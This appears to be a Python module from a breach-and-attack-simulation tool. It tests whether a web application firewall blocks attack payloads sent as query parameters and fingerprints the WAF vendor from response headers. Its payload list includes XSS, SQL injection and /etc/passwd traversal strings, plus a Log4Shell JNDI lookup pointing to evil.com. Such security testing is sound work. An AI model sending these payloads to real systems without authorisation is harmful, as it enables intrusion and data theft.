import aiohttp
import asyncio
import urllib.parse

from urllib.parse import urlparse

from .base import BaseAttackModule
from bas_engine.models.simulation import Severity


# =========================================================
# FAST MODE CONFIG
# =========================================================

FAST_MODE = True

MAX_REQUESTS = 60

DELAY_BETWEEN = 0.08

WAF_BLOCK_CODES = [
    403,
    406,
    429
]

# =========================================================
# PARAMETERS
# =========================================================

PARAMETERS = [
    "q",
    "search",
    "id",
]

# =========================================================
# COMMON PATHS
# =========================================================

COMMON_PATHS = [

    "/",
    "/login",
    "/search",
    "/admin",
]

# =========================================================
# PAYLOADS
# =========================================================

PAYLOADS = [

    (
        "XSS_PLAIN",
        "<script>alert(1)</script>",
        "941100",
        "XSS"
    ),

    (
        "XSS_DOUBLE",
        "%253Cscript%253Ealert(1)%253C/script%253E",
        "941100",
        "XSS_DOUBLE"
    ),

    (
        "SQLI_UNION",
        "' UNION SELECT NULL,NULL--",
        "942200",
        "SQLI"
    ),

    (
        "PATH_TRAVERSAL",
        "../../../../etc/passwd",
        "930100",
        "TRAVERSAL"
    ),

    (
        "LOG4SHELL",
        "${jndi:ldap://evil.com/x}",
        "932130",
        "LOG4SHELL"
    ),
]


# =========================================================
# MODULE
# =========================================================

class WAFEvasionModule(BaseAttackModule):

    MODULE_NAME = "waf_evasion"

    DESCRIPTION = (
        "Fast adaptive WAF intelligence engine"
    )

    MITRE_TACTIC = "Initial Access"

    MITRE_IDS = ["T1190"]


    # =====================================================
    # URL GENERATION
    # =====================================================

    def build_target_urls(self):

        parsed = urlparse(self.target)

        base = f"{parsed.scheme}://{parsed.netloc}"

        urls = []

        for path in COMMON_PATHS:

            urls.append(base + path)

        return urls


    # =====================================================
    # HEADER CLASSIFICATION
    # =====================================================

    def classify_headers(self, headers):

        headers = {
            k.lower(): v
            for k, v in headers.items()
        }

        result = {

            "proxy_detected": False,
            "waf_detected": False,
            "vendor": None,
            "type": None,
        }

        # -------------------------------------------------
        # CLOUDFLARE
        # -------------------------------------------------

        if "cf-ray" in headers:

            result["proxy_detected"] = True
            result["waf_detected"] = True
            result["vendor"] = "Cloudflare"
            result["type"] = "CDN/WAF"

        # -------------------------------------------------
        # AWS WAF
        # -------------------------------------------------

        elif "x-amzn-requestid" in headers:

            result["waf_detected"] = True
            result["vendor"] = "AWS WAF"
            result["type"] = "WAF"

        # -------------------------------------------------
        # IMPERVA
        # -------------------------------------------------

        elif "x-iinfo" in headers:

            result["waf_detected"] = True
            result["vendor"] = "Imperva"
            result["type"] = "WAF"

        # -------------------------------------------------
        # FASTLY
        # -------------------------------------------------

        elif "x-served-by" in headers:

            result["proxy_detected"] = True
            result["vendor"] = "Fastly"
            result["type"] = "CDN"

        # -------------------------------------------------
        # SERVER DETECTION
        # -------------------------------------------------

        server = headers.get(
            "server",
            ""
        ).lower()

        if "nginx" in server:

            result["proxy_detected"] = True

            if not result["type"]:

                result["type"] = "Reverse Proxy"

        if "apache" in server:

            result["proxy_detected"] = True

            if not result["type"]:

                result["type"] = "Reverse Proxy"

        return result


    # =====================================================
    # BASELINE ANALYSIS
    # =====================================================

    async def baseline_analysis(
        self,
        session
    ):

        analysis = {

            "reachable": False,
            "baseline_allowed": False,
            "baseline_status": None,
            "headers": {},
            "classification": {},
        }

        try:

            async with session.get(

                self.target,

                ssl=False,

                timeout=6,

                allow_redirects=True

            ) as response:

                analysis["reachable"] = True

                analysis["baseline_status"] = response.status

                analysis["headers"] = dict(
                    response.headers
                )

                if response.status < 400:

                    analysis["baseline_allowed"] = True

                analysis["classification"] = (
                    self.classify_headers(
                        response.headers
                    )
                )

        except Exception as e:

            analysis["error"] = str(e)

        return analysis


    # =====================================================
    # SEND PAYLOAD
    # =====================================================

    async def send_payload(

        self,

        session,

        base_url,

        parameter,

        label,

        payload,

        expected_rule,

        category,
    ):

        encoded = urllib.parse.quote(
            payload,
            safe="%"
        )

        url = (
            f"{base_url}"
            f"?{parameter}={encoded}"
        )

        result = {

            "label": label,
            "payload": payload,
            "category": category,
            "url": url,
            "expected_rule": expected_rule,
        }

        try:

            async with session.get(

                url,

                ssl=False,

                allow_redirects=False,

                timeout=6

            ) as response:

                result["status"] = response.status

                result["headers"] = dict(
                    response.headers
                )

                # -----------------------------------------
                # BLOCKED
                # -----------------------------------------

                if response.status in WAF_BLOCK_CODES:

                    result["blocked"] = True

                    result["outcome"] = "BLOCKED"

                # -----------------------------------------
                # ALLOWED
                # -----------------------------------------

                else:

                    result["blocked"] = False

                    result["outcome"] = "ALLOWED"

        except asyncio.TimeoutError:

            result["status"] = "TIMEOUT"

            result["blocked"] = False

            result["outcome"] = "TIMEOUT"

        except Exception as e:

            result["status"] = "ERROR"

            result["blocked"] = False

            result["outcome"] = str(e)

        return result


    # =====================================================
    # MAIN EXECUTION
    # =====================================================

    async def execute(self):

        findings = []

        attack_results = []

        request_count = 0

        stop_scan = False

        path_block_counter = {}

        connector = aiohttp.TCPConnector(
            ssl=False
        )

        async with aiohttp.ClientSession(

            connector=connector

        ) as session:

            # =================================================
            # BASELINE ANALYSIS
            # =================================================

            baseline = await self.baseline_analysis(
                session
            )

            print(
                "\n=== BASELINE ANALYSIS ==="
            )

            print(baseline)

            # =================================================
            # EARLY EXIT IF DEAD TARGET
            # =================================================

            if not baseline.get("reachable"):

                findings.append(

                    self.finding(

                        title="Target Unreachable",

                        description=(
                            f"Could not reach "
                            f"{self.target}"
                        ),

                        severity=Severity.MEDIUM,

                        mitre_id="T1190",

                        raw_data=baseline,
                    )
                )

                return findings

            # =================================================
            # URLS
            # =================================================

            urls = self.build_target_urls()

            # =================================================
            # ATTACK LOOP
            # =================================================

            for base_url in urls:

                if stop_scan:
                    break

                path_block_counter[
                    base_url
                ] = 0

                # ---------------------------------------------
                # SKIP HEAVILY PROTECTED PATHS
                # ---------------------------------------------

                if path_block_counter[
                    base_url
                ] >= 10:

                    print(
                        f"[!] Skipping protected path: "
                        f"{base_url}"
                    )

                    continue

                for parameter in PARAMETERS:

                    if stop_scan:
                        break

                    for (

                        label,
                        payload,
                        expected_rule,
                        category

                    ) in PAYLOADS:

                        if stop_scan:
                            break

                        # -------------------------------------
                        # MAX LIMIT
                        # -------------------------------------

                        if request_count >= MAX_REQUESTS:

                            print(
                                "\n[!] MAX REQUEST "
                                "LIMIT REACHED"
                            )

                            stop_scan = True

                            break

                        result = await self.send_payload(

                            session,

                            base_url,

                            parameter,

                            label,

                            payload,

                            expected_rule,

                            category
                        )

                        request_count += 1

                        attack_results.append(
                            result
                        )

                        # -------------------------------------
                        # PATH BLOCK TRACKING
                        # -------------------------------------

                        if result.get("blocked"):

                            path_block_counter[
                                base_url
                            ] += 1

                        print(

                            f"[{result['outcome']}] "

                            f"{category} "

                            f"{result['status']} "

                            f"{base_url}"
                        )

                        # -------------------------------------
                        # HIGH CONFIDENCE STOP
                        # -------------------------------------

                        blocked_now = len([

                            r for r in attack_results
                            if r.get("blocked")
                        ])

                        allowed_now = len([

                            r for r in attack_results
                            if r.get("blocked") is False
                        ])

                        if blocked_now >= 20 \
                        and allowed_now <= 2:

                            print(
                                "\n[!] HIGH "
                                "CONFIDENCE WAF "
                                "DETECTED"
                            )

                            stop_scan = True

                            break

                        await asyncio.sleep(
                            DELAY_BETWEEN
                        )

        # =====================================================
        # ANALYSIS
        # =====================================================

        blocked = len([

            r for r in attack_results
            if r.get("blocked")
        ])

        bypassed = len([

            r for r in attack_results
            if r.get("blocked") is False
        ])

        total = len(attack_results)

        confidence = 0

        waf_detected = False

        if total > 0:

            ratio = blocked / total

            confidence = int(
                ratio * 100
            )

            if ratio > 0.35:

                waf_detected = True

        classification = baseline.get(
            "classification",
            {}
        )

        # =====================================================
        # RISK SCORING
        # =====================================================

        if bypassed > blocked:

            risk = "high"

        elif blocked > bypassed:

            risk = "low"

        else:

            risk = "medium"

        # =====================================================
        # NORMALIZATION DEPTH
        # =====================================================

        normalization_depth = "none"

        double_encoded_blocked = any(

            r["label"] == "XSS_DOUBLE"
            and r.get("blocked")

            for r in attack_results
        )

        if double_encoded_blocked:

            normalization_depth = (
                "double_url_encoded"
            )

        # =====================================================
        # FINAL INTELLIGENCE OBJECT
        # =====================================================

        intelligence = {

            "target":
                self.target,

            "reachable":
                baseline.get(
                    "reachable"
                ),

            "proxy_detected":
                classification.get(
                    "proxy_detected"
                ),

            "waf_detected":
                waf_detected
                or classification.get(
                    "waf_detected"
                ),

            "waf_vendor":
                classification.get(
                    "vendor"
                ),

            "infrastructure_type":
                classification.get(
                    "type"
                ),

            "confidence":
                confidence,

            "baseline_behavior":
                (
                    "allowed"
                    if baseline.get(
                        "baseline_allowed"
                    )
                    else "blocked"
                ),

            "payloads_tested":
                total,

            "blocked":
                blocked,

            "bypassed":
                bypassed,

            "normalization_depth":
                normalization_depth,

            "risk_level":
                risk,
        }

        print(
            "\n=== ATTACK SURFACE "
            "INTELLIGENCE ==="
        )

        print(intelligence)

        # =====================================================
        # MAIN FINDING
        # =====================================================

        findings.append(

            self.finding(

                title=(
                    "Adaptive WAF "
                    "Intelligence Analysis"
                ),

                description=(

                    f"WAF="
                    f"{intelligence['waf_detected']} "

                    f"Vendor="
                    f"{intelligence['waf_vendor']} "

                    f"Blocked="
                    f"{blocked}/{total} "

                    f"Confidence="
                    f"{confidence}% "

                    f"Risk="
                    f"{risk}"
                ),

                severity=(

                    Severity.LOW

                    if blocked > bypassed

                    else Severity.HIGH
                ),

                mitre_id="T1190",

                raw_data=intelligence,
            )
        )

        return findings